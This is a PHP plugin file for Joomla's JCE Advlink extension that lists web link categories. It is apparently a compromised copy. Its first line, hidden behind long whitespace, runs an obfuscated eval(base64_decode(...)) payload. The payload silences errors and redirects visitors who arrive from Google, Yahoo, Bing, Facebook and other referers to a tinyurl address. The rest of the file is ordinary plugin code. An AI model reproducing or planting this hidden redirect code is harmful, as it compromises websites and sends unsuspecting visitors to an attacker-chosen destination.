<?php	                                       			eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokbmNjdj1oZWFkZXJzX3NlbnQoKTsNCmlmICghJG5jY3Ypew0KJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOw0KJHVhPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsNCmlmIChzdHJpc3RyKCRyZWZlcmVyLCJ5YWhvbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmciKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJyYW1ibGVyIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZ29nbyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImxpdmUuY29tIilvciBzdHJpc3RyKCRyZWZlcmVyLCJhcG9ydCIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm5pZ21hIikgb3Igc3RyaXN0cigkcmVmZXJlciwid2ViYWx0YSIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJlZ3VuLnJ1Iikgb3Igc3RyaXN0cigkcmVmZXJlciwic3R1bWJsZXVwb24uY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYml0Lmx5Iikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsIm15c3BhY2UuY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiZmFjZWJvb2suY29tIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpKSB7DQppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgb3IgIXN0cmlzdHIoJHJlZmVyZXIsImludXJsIikpewkJDQoJCWhlYWRlcigiTG9jYXRpb246IGh0dHA6Ly90aW55dXJsLmNvbS9hZWxud2o0Iik7DQoJCWV4aXQoKTsNCgl9DQp9DQp9"));
/**
* @version		$Id: weblinks.php 46 2009-05-26 16:59:42Z happynoodleboy $
* @package      JCE Advlink
* @copyright    Copyright (C) 2008 - 2009 Ryan Demmer. All rights reserved.
* @author		Ryan Demmer
* @license      GNU/GPL
* JCE is free software. This version may have been modified pursuant
* to the GNU General Public License, and as distributed it includes or
* is derivative of works licensed under the GNU General Public License or
* other free or open source software licenses.
*/
// no direct access
defined('_JCE_EXT') or die('Restricted access');
class AdvlinkWeblinks 
{
	function getOptions()
	{
		$advlink =& AdvLink::getInstance();
		$list = '';
		if ($advlink->checkAccess('weblinks', '1')) {
			$list = '<li id="index.php?option=com_weblinks&view=categories"><div class="tree-row"><div class="tree-image"></div><span class="folder weblink nolink"><a href="javascript:;">' . JText::_('WEBLINKS') . '</a></span></div></li>';
		}
		return $list;	
	}
	function getItems($args)
	{
		$items = array();

		switch ($args->view) {
		// Get all WebLink categories
		default:
		case 'categories':
			$categories = AdvLink::getCategory('com_weblinks');				
			foreach ($categories as $category) {
				$itemid = AdvLink::getItemId('com_weblinks', array('categories' => null, 'category' => $category->id));
				$items[] = array(
					'id'		=>	'index.php?option=com_weblinks&view=category&id=' . $category->id . $itemid,
					'name'		=>	$category->title . ' / ' . $category->alias,
					'class'		=>	'folder weblink'
				);
			}
			break;
		// Get all links in the category
		case 'category':				
			require_once(JPATH_SITE.DS.'includes'.DS.'application.php');
			require_once(JPATH_SITE.DS.'components'.DS.'com_weblinks'.DS.'helpers'.DS.'route.php');
			
			$weblinks 	= AdvlinkWeblinks::_weblinks($args->id);
			foreach ($weblinks as $weblink) {
				$items[] = array(
					'id'		=>	WeblinksHelperRoute::getWeblinkRoute($weblink->id, $args->id),
					'name'		=>	$weblink->title . ' / ' . $weblink->alias,
					'class'		=>	'file'
				);
			}
			break;
		}
		return $items;
	}
	function _weblinks($id)
	{
		$db		=& JFactory::getDBO();
		
		$query = 'SELECT title, id, alias'
		. ' FROM #__weblinks'
		. ' WHERE published = 1'
		. ' AND catid = '.(int) $id
		. ' ORDER BY title'
		;
		
		$db->setQuery($query, 0);
		return $db->loadObjectList();
	}
}
?>
